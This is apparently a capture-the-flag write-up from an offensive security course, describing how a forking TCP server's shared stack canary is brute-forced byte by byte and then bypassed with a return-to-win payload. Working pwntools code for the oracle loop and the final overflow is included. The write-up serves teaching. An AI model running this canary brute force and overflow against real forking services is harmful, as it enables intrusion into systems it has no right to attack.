# Fortune Cookie

**Category:** pwn / remote canary brute force (forking server) · **Course:** Offensive Security (PoliTo)

## Challenge

A tiny forking TCP server (`fork()` per connection) reads 256 bytes into a 64-byte buffer and just... returns. No format string helper this time — the canary has to be defeated blind.

## Vulnerability

Because the server `fork()`s a child per connection without re-exec'ing, every child inherits the exact same stack canary from the parent. That turns the canary from a "crash-and-restart" protection into an oracle: send a guess, and a clean `OK` response (rather than a crash/disconnect) confirms the byte is right.

## Exploitation

1. Brute-force the canary one byte at a time. Canaries always start with a null byte, so `known` begins as `b"\x00"` and only 7 bytes remain — at most 256 × 7 ≈ 1800 connections. Each guess sends `b"A" * 72 + known + byte`; if the reply contains `OK`, the guessed byte survived the canary check and is kept.
2. Once the full 8-byte canary is recovered, send the real payload: 72 bytes of padding, the correct canary so the epilogue passes, 8 bytes of saved-RBP filler, a bare `ret` gadget for 16-byte stack alignment, then the address of `win()`.

The byte-at-a-time oracle loop (as in `solve.py`):

```python
known = b"\x00"                             # canary's first byte is always NUL
for i in range(7):
    for bval in range(256):
        guess   = known + bytes([bval])
        payload = b"A" * OFFSET_TO_CANARY + guess
        io = remote(HOST, PORT, level='error')
        io.recvuntil(b"wish\n")
        io.send(payload)
        data = io.recv(timeout=0.2)
        io.close()
        if b"OK" in data:                   # byte confirmed correct
            known = guess
            break
canary = u64(known)
```

Final exploit with the recovered canary:

```python
payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),                            # 0x81c8c213f4078f00 on this instance
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
    p64(0x000000000040101a),                # ret gadget, stack alignment
    p64(elf.sym.win),
)
```

## Files

- `main.c` — challenge source
- `Makefile` — build recipe (`-fstack-protector-all -no-pie`: canary enabled, fixed load address)
- `fortune_cookie` — compiled challenge binary
- `solve.py` — working exploit (pwntools); the brute-force loop is left commented out with the recovered canary hardcoded for a fast re-run

## Flag

`offsec{...redacted...}` — captured against the remote instance; redacted here per standard write-up etiquette.
